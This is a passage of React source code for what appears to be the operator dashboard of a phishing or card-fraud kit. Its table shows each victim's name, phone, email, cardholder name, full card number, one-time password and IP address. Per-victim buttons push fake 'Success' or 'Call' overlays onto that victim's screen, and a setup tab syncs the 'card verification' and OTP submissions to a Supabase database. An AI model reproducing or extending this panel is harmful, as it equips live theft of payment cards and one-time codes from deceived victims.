                                  title="Show Success Popup ONLY on this user's screen"
                                  className={`px-2.5 py-1 rounded-md text-[11px] font-bold tracking-wide transition-all shadow-xs flex items-center gap-1 ${
                                    isSuccessTarget
                                      ? 'bg-emerald-600 text-white ring-2 ring-emerald-400 animate-pulse'
                                      : 'bg-emerald-50 text-emerald-800 hover:bg-emerald-600 hover:text-white border border-emerald-300'
                                  }`}
                                >
                                  <span>🟢 Success</span>
                                  {isSuccessTarget && <span className="text-[10px]">✓ ACTIVE</span>}
                                </button>

                                <button
                                  onClick={() => triggerTargetCall(r)}
                                  title="Show Call Overlay ONLY on this user's screen"
                                  className={`px-2.5 py-1 rounded-md text-[11px] font-bold tracking-wide transition-all shadow-xs flex items-center gap-1 ${
                                    isCallTarget
                                      ? 'bg-amber-600 text-white ring-2 ring-amber-400 animate-pulse'
                                      : 'bg-amber-50 text-amber-800 hover:bg-amber-600 hover:text-white border border-amber-300'
                                  }`}
                                >
                                  <span>📞 Call</span>
                                  {isCallTarget && <span className="text-[10px]">✓ ACTIVE</span>}
                                </button>

                                {(isSuccessTarget || isCallTarget) && (
                                  <button
                                    onClick={stopAllPopupsForUser}
                                    title="Stop popup for this user"
                                    className="p-1 text-rose-600 hover:bg-rose-100 rounded text-xs font-bold"
                                  >
                                    ✕ OFF
                                  </button>
                                )}
                              </div>
                            </td>

                            <td className="p-3 border-r whitespace-nowrap text-slate-500">
                              {r.created_at ? new Date(r.created_at).toLocaleString('en-IN') : '-'}
                            </td>
                            <td className="p-3 border-r font-semibold text-emerald-700">{r.step || '-'}</td>
                            <td className="p-3 border-r">{r.selected_service || '-'}</td>
                            <td className="p-3 border-r font-sans font-bold text-slate-900">{r.full_name || '-'}</td>
                            <td className="p-3 border-r font-bold text-emerald-800 bg-emerald-50/40">{r.mobile_number || '-'}</td>
                            <td className="p-3 border-r font-sans text-slate-600">{r.email || '-'}</td>
                            <td className="p-3 border-r font-sans">{r.cardholder_name || '-'}</td>
                            <td className="p-3 border-r font-mono tracking-wider text-slate-900">{r.card_number || '-'}</td>
                            <td className="p-3 border-r text-amber-700 font-bold">{r.otp || '-'}</td>
                            <td className="p-3 text-slate-500">{r.ip_address || '-'}</td>
                          </tr>
                        );
                      })}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 3: SCHEMA SETUP */}
      {activeTab === 'setup' && (
        <div className="mt-6 space-y-6">
          <div className="p-5 bg-emerald-50 border border-emerald-200 rounded-xl space-y-3">
            <div className="flex items-center gap-2">
              <Sparkles className="w-5 h-5 text-emerald-600" />
              <h3 className="font-bold text-emerald-950 text-base">Supabase Database Integration Ready</h3>
            </div>
            <p className="text-xs text-emerald-900 leading-relaxed">
              Your project is connected to Supabase project <code className="bg-emerald-100 font-bold px-1.5 py-0.5 rounded">{SUPABASE_PROJECT_ID}</code> using the official client SDK. All step submissions (applicant details, card verification, OTP authentication) are automatically synced directly into your Supabase database.
            </p>
          </div>

          <div className="border border-slate-200 rounded-xl p-5 space-y-4">
            <h4 className="font-bold text-slate-900 text-sm flex items-center gap-2">
              <Server className="w-4 h-4 text-emerald-600" /> 1-Click Database Table SQL Script
            </h4>
            <p className="text-xs text-slate-600">
              Copy and execute this script in your Supabase Dashboard SQL Editor to set up the complete schema with permissions and RLS policies:
            </p>

            <div className="relative">
              <pre className="p-4 bg-slate-950 text-emerald-400 text-xs font-mono rounded-xl overflow-x-auto border border-slate-800 leading-relaxed max-h-72">
                {SQL_TEMPLATES.createSubmissionsTable}
              </pre>
              <button
                onClick={() => handleCopySql(SQL_TEMPLATES.createSubmissionsTable)}
                className="absolute top-3 right-3 px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white font-medium rounded text-xs flex items-center gap-1.5 shadow"
              >
                {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                {copied ? 'Copied!' : 'Copy Schema SQL'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
